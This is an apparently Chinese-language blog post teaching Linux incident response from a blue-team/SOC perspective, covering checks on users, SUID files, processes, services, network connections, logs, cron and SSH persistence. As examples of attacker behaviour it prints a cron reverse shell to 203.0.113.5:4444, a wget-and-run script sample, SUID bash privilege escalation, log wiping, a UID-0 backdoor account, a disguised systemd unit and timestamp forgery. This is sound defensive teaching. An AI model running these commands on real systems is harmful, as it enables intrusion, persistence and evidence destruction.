---
title: 蓝队的Linux
published: 2026-07-17
updated: 2026-07-18
draft: false
description: SOC安全运营视角下的Linux — 运维基本功+攻防对抗思路
image: ""
tags:
  - Linux
  - 蓝队
  - SOC
category: Linux运维
pinned: false
comment: true
author: Ziddzide
---

# 蓝队的Linux

> SOC 安全运营视角。不是背命令，是讲每个操作在实战里怎么用、攻击者会怎么绕。

---

## 系统概况

应急上机，先摸清楚这台机器什么情况：

```bash
hostname            # 机器名
uname -a            # 内核版本、架构
uptime              # 跑了多久，判断是不是刚重启过
date                # 当前系统时间（判断日志时间是否可信）
whoami              # 当前登录身份
```

**思路：** 攻击者拿下机器后可能会改 hostname 伪装成别的服务器，或者改系统时间干扰日志分析。`uptime` 如果显示只跑了十几分钟但日志里有几天的记录，说明系统被重启过，日志可能有断层。

---

## 目录结构

SOC分析不用背所有目录，记住这几个：

| 目录 | 存什么 | 蓝队看什么 |
|------|--------|-----------|
| `/etc/` | 系统配置 | passwd、shadow、sudoers、hostname、ssh配置 |
| `/home/` `/root/` | 用户文件 | 攻击者可能在这藏东西 |
| `/tmp/` `/dev/shm/` | 临时/共享内存 | **攻击者最爱**，可写可执行，重启就丢不留痕 |
| `/var/log/` | 系统日志 | auth.log、syslog、btmp、wtmp |
| `/var/www/` | Web目录 | webshell |
| `/opt/` `/usr/local/` | 第三方软件 | 不常见的二进制可能在这 |

**思路：** `/tmp` 和 `/dev/shm/` 是 Linux 下落马的热门位置，因为普通用户就有写权限。而且很多安全监控不扫 `/dev/shm/`。应急时第一件事：

```bash
ls -la /tmp/
ls -la /dev/shm/
```

---

## 用户分析

** — 排查命令：**

```bash
cat /etc/passwd              # 全量用户列表
cat /etc/shadow              # 密码哈希（要root）
w                            # 当前登录用户+在干什么
last                         # 最近登录记录
lastb                        # 登录失败记录
```

**怎么快速筛可疑用户：**

```bash
# 看哪些用户有登录shell（排除系统服务用户）
grep -E '/bin/(bash|sh|zsh)' /etc/passwd

# 看UID为0的非root用户（root权限的隐藏用户）
awk -F: '($3 == 0 && $1 != "root") {print}' /etc/passwd

# 看空密码的用户
awk -F: '($2 == "" || $2 == "!") {print}' /etc/shadow

# 最近一周内创建的用户
grep "$(date +%Y-%m-%d -d '7 days ago')" /etc/passwd
# 或者看 passwd 文件修改时间
ls -la /etc/passwd
```

**思路：**

攻击者常用的持久化手段是在 passwd 里加用户：

```
evil:x:0:0:root:/root:/bin/bash    # UID=0，等同于root权限
```

但直接加用户太明显，有经验的攻击者会：
- 用已有的普通用户提权后隐藏行踪
- 或者直接替换 root 密码
- 清理 `last` 和 `wtmp` 日志来掩盖登录痕迹

```bash
# 攻击者常用清理命令
echo > /var/log/wtmp
echo > /var/log/btmp
history -c
```

碰到 wtmp/btmp 为空但 auth.log 有登录记录，说明日志被部分清理，本身就是线索。

**关于 sudo：**

```bash
sudo -l -U username            # 看某个用户能执行什么sudo命令
cat /etc/sudoers               # sudo规则
grep -r "NOPASSWD" /etc/sudoers.d/   # 免密码sudo——攻击者提权后常加的
```

攻击者拿到权限后常给自己加 `NOPASSWD`，以后 sudo 不需要输密码，用起来更隐蔽。

---

## 文件权限

Linux 的权限模型是安全基础，攻击者也在这上面做文章。

```
-rwxr-xr-x
↑↑↑↑↑↑↑↑↑↑
│││││││││
│││││││└┴── 其他人权限（r-x）
│││││└──┴─── 组权限（r-x）
│││└──┴────── 所有者权限（rwx）
│└┴────────── 文件类型（-普通文件，d目录）
```

数字表示法：读(r)=4、写(w)=2、执行(x)=1

```
chmod 755 file    → rwxr-xr-x
chmod 644 file    → rw-r--r--
```

**SUID 提权 —— 蓝队重点排查项：**

SUID 是让普通用户能以文件所有者的身份执行该文件。攻击者传一个带 SUID 的 bash 上去就能提权。

```bash
find / -perm -4000 -o -perm -2000 2>/dev/null
```

看到不认识的二进制文件有 SUID，要警觉。

**思路：** 攻击者上传 `/tmp/shell` 并设置 SUID，然后普通用户执行就直接拿到 root shell。

```bash
cp /bin/bash /tmp/.bash
chmod 4755 /tmp/.bash
/tmp/.bash -p          # -p 保留SUID权限
```

蓝队排查时要注意 find 命令也可能被攻击者替换。可以用 `stat` 命令看二进制文件属性：

```bash
stat /bin/find         # 看大小、修改时间、权限是否异常
```

---

## 进程和服务

### 进程快照

```bash
ps aux                  # 所有进程
ps auxf                 # 树形结构，看父子关系
ps -eo pid,ppid,uid,cmd --sort=-%cpu   # 按CPU排序
```

**怎么看进程是否可疑：**

- **名字伪装** — 攻击者常把木马命名为系统进程名。比如真正的 `sshd` 在 `/usr/sbin/sshd`，但在 `/tmp/sshd` 的那个就是假的。直接用 `which sshd` 看系统认不认
- **父进程异常** — 通过 SSH 登录后，你敲的命令父进程是 sshd。如果 `crond` 的父进程不是 systemd 而是 bash，那就可疑
- **没有可执行文件** — 有些进程在 `/proc/PID/exe` 下显示 `(deleted)`，说明二进制已经被删了，这是典型的"落马执行后删原文件"的手法

```bash
# 看进程对应的可执行文件路径
ls -la /proc/PID/exe

# 看进程启动的完整命令行
cat /proc/PID/cmdline | tr '\0' ' '
```

**思路：** 攻击者会用各种手段隐藏进程：
- **rootkit** 直接 hook 系统调用，`ps` 看不到恶意进程。这时候需要对比 `/proc/` 目录数量和 `ps` 输出数量，或者用 `unhide` 工具检测
- **进程名改短** — Linux 进程名可以改，攻击者把恶意进程名字改成 15 个字符以内混在系统进程里

```bash
# 检测隐藏进程的土办法
ps aux | wc -l
ls /proc/ | grep -E '^[0-9]+$' | wc -l
# 如果两者差距大，大概率有隐藏进程
```

### 实时监控

```bash
top                   # 按 P 看CPU最高，按 M 看内存最高
htop                  # top的增强版（可能需要装）
```

CPU 飙高不一定是坏事——可能是合法的服务。但如果是 `/tmp/` 下的二进制占 90% CPU，那基本是矿机。

### 服务管理 — systemctl

服务是系统后台长期跑的进程，由 systemd 管。

```bash
# 所有服务（包括没运行的）
systemctl list-units --type=service

# 只看正在跑的
systemctl list-units --type=service --state=running

# 看某个服务的详细信息
systemctl status ssh.service

# 起停控制
systemctl stop ssh
systemctl start ssh
systemctl restart ssh
systemctl enable ssh     # 开机自启
systemctl disable ssh    # 禁用开机自启
```

**服务文件在哪：**

```bash
/lib/systemd/system/        # 系统自带的服务定义
/etc/systemd/system/        # 用户自定义的服务（攻击者可能往这加）
```

**排查：** 对所有不认识的服务，看它的 ExecStart 字段：

```bash
cat /etc/systemd/system/xxx.service
```

重点看 ExecStart 指向的二进制在哪、有没有问题。

**思路：** 攻击者可以注册一个恶意 systemd 服务实现持久化：

```
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.update
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
```

特点：
- 名字写成正常服务名（"System Update"）
- `Restart=always` + `RestartSec=60` — 就算你把进程杀了，60秒后自动拉起来
- 杀掉进程没用，必须 `systemctl disable` 再删服务文件

**蓝队处理：**
```bash
systemctl stop xxx.service
systemctl disable xxx.service
rm /etc/systemd/system/xxx.service
# 还要删掉对应的二进制文件
```

---

## 网络连接

**排查：**

```bash
ip a                    # IP、MAC地址
ip route                # 路由表，默认网关

ss -tlnp                # 监听端口（服务端口的入口）
ss -tunp                # 所有连接（包括外连）
ss -tunp | grep ESTAB   # 只看已建立的连接——应急第一步
```

**怎么看监听端口是否正常：**

常见端口：22(SSH)、80/443(Web)、3306(MySQL)、6379(Redis)

如果看到 `:4444`、`:1337`、`:6666`、`:31337` 这类端口监听，几乎可以断定有问题。

**怎么看已建立连接：**

```bash
ss -tunp | grep ESTAB
```

输出样例：
```
ESTAB  0  0  192.168.1.100:22  192.168.1.50:54321  users:(("sshd",pid=1234))
ESTAB  0  0  192.168.1.100:443  10.0.0.5:33333     users:(("apache2",pid=5678))
```

**思路：**

攻击者建立的反向 shell 连接通常长这样：

```
ESTAB  0  0  192.168.1.100:4444  203.0.113.5:8888  users:(("bash",pid=9999))
```

特征：
- 源端口是**高端口**（4444、5555、8888 等非常用端口）
- 连接的是**外网 IP**
- 进程是 bash、sh 或 nc 这类 shell 工具
- 用 `-p` 参数看进程名，如果进程名是合法的（比如改了名的 bash）但 PID 不是系统进程，也要怀疑

**绕过的套路：**
- 攻击者用 **ICMP 隧道** 或 **DNS 隧道** 传数据，`ss` 上看不到 TCP 连接
- 或者通过 **已信任的进程**（如 curl 从外网拉数据）外联，表面看是正常请求

```bash
# 检查是否有异常的网络命名空间（攻击者可能创建隐藏的网络环境）
ip netns list
```

---

## 日志分析

**日志路径速记：**

```bash
/var/log/auth.log      # SSH登录、sudo、su 操作
/var/log/syslog        # 通用系统日志
/var/log/kern.log      # 内核日志
/var/log/dpkg.log      # 软件包安装记录
/var/log/apt/history.log   # apt 安装卸载记录
```

**常用排查组合：**

```bash
# SSH 爆破
grep "Failed password" /var/log/auth.log

# 成功登录
grep "Accepted" /var/log/auth.log

# sudo 执行记录
grep "sudo" /var/log/auth.log

# 按时间段过滤
grep "Jul 18 10:" /var/log/auth.log

# 提取所有登录IP并去重
grep "Accepted" /var/log/auth.log | grep -oP 'from \K\S+' | sort -u
```

**历史命令分析：**

```bash
cat ~/.bash_history
# 或者在root下翻所有用户的历史
cat /home/*/.bash_history
```

**典型攻击痕迹在 history 里的表现：**

```
wget http://malicious.com/shell.sh    # 下载恶意脚本
chmod +x shell.sh
./shell.sh
rm -f shell.sh                        # 删掉原文件灭迹
crontab -e                            # 添加计划任务持久化
```

**思路：**
- 攻击者会用 `unset HISTORY`、`history -c` 关闭历史记录
- 或者把 `HISTSIZE=0` 写到 bashrc 里
- 或者直接 `rm ~/.bash_history`
- 但 **高水平的攻击者不会清空**——因为空了就是线索。他们会删敏感行，保留正常操作填充

蓝队可以先看 history 文件大小，如果文件存在但为空，或者只有几十条而系统跑了好几个月，那肯定被处理过。

```bash
# 对比
ls -la ~/.bash_history
wc -l ~/.bash_history
```

---

## 持久化检测

拿到权限只是第一步，攻击者真正想做的是长期控制。持久化方式有很多种，下面的都是蓝队必须能翻的地方。

### 计划任务（cron）

**排查：**

```bash
crontab -l                    # 当前用户的计划任务
cat /etc/crontab              # 系统级cron主文件
ls -la /etc/cron.d/           # cron任务切片
ls -la /etc/cron.hourly/      # 按时执行的脚本目录
ls -la /etc/cron.daily/
```

**cron 格式：**

```
分钟 小时 日期 月份 星期  命令
*/5   *    *    *    *    /path/to/script
```

**排查标准流程：**
1. 以上几个地方全翻一遍
2. 对每条不认识的任务，看它执行的命令/脚本在哪
3. 如果脚本路径在 `/tmp`、`/dev/shm`、`/var/tmp`，极大概率有问题

**思路：**

攻击者的典型 cron 后门：
```
*/5 * * * * /bin/bash -c "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"
```
每 5 分钟反弹一次 shell，杀了一次又连回来。

还有更隐蔽的写法：
```
@reboot /tmp/.systemd-update
```
`@reboot` 表示系统启动时执行一次。和 cron 的后门交叉。

### SSH 后门

```bash
cat ~/.ssh/authorized_keys         # root的授权公钥
cat /home/*/.ssh/authorized_keys   # 所有用户的
```

蓝队排查时留意 authorized_keys 的修改时间。不认识的公钥直接删。

**思路：** 攻击者会改 `.ssh/authorized_keys` 文件权限和修改时间来伪装：
```bash
touch -r /etc/passwd ~/.ssh/authorized_keys   # 把时间改成和passwd一致
chmod 600 ~/.ssh/authorized_keys               # 改成和正常一致
```

### 开机启动项

```bash
systemctl list-unit-files --state=enabled     # 开机自启的服务
ls /etc/init.d/                                # 传统init脚本

# 查看各运行级别的启动脚本
ls -la /etc/rc*.d/
```

**思路：** 攻击者会在 `/etc/rc.local` 里加启动命令：
```bash
cat /etc/rc.local
# 常见后门：
# /tmp/.backdoor &
# nohup /root/shell &
```

---

## 文件排查

**按时间找：**

```bash
# 最近24小时内修改过的文件
find / -mtime -1 2>/dev/null

# 最近1小时内修改过的
find / -mmin -60 2>/dev/null
```

**按大小找：**

```bash
# 大文件（可能是在打包数据准备泄露）
find / -type f -size +100M 2>/dev/null
```

**按权限找：**

```bash
# 所有人都可写的文件
find / -perm -o+w -type f 2>/dev/null
```

**隐藏文件：**

Linux 中以 `.` 开头的文件是隐藏的。攻击者常把东西藏在：

```
/home/user/.config/.cache/.update
/usr/share/.hidden/
```

```bash
# 查所有用户家目录的隐藏文件
find /home /root -name ".*" -type f 2>/dev/null | grep -v ".bash" | grep -v ".ssh"
```

**思路：** 攻击者用 `touch -r` 把恶意文件的时间戳改成系统文件一致来规避时间排查。可以用 `stat` 看完整时间戳：

```bash
stat /tmp/suspicious
stat /bin/ls
# 对比ctime（状态变更时间）和mtime（修改时间）
# 如果两者相差很大，说明时间戳被人为改过
```

---

## 压缩打包

```bash
tar -czvf evidence.tar.gz /var/log/ /etc/passwd /etc/shadow /var/spool/cron/
unzip suspicious.zip
unzip suspicious.zip -d /analysis/
```

取证时把关键目录 `/var/log/`、`/etc/`、`/home/`、`/tmp/` 打包带走分析。

---

## 排查清单

| 排查项 | 关键命令 | 看什么 |
|--------|----------|--------|
| 用户异常 | `/etc/passwd` `last` `w` | UID=0的非root、新用户、历史登录 |
| 进程异常 | `ps auxf` | 伪装进程名、父进程异常、deleted |
| 服务异常 | `systemctl list-units --state=running` | 不认识的服务、ExecStart在/tmp |
| 网络异常 | `ss -tunp | grep ESTAB` | 外连IP、非常用端口、shell进程 |
| 日志异常 | `/var/log/auth.log` | 爆破、异常时间登录、sudo记录 |
| 持久化 | `crontab -l` `/etc/cron*` `.ssh/authorized_keys` | 定时任务、SSH公钥 |


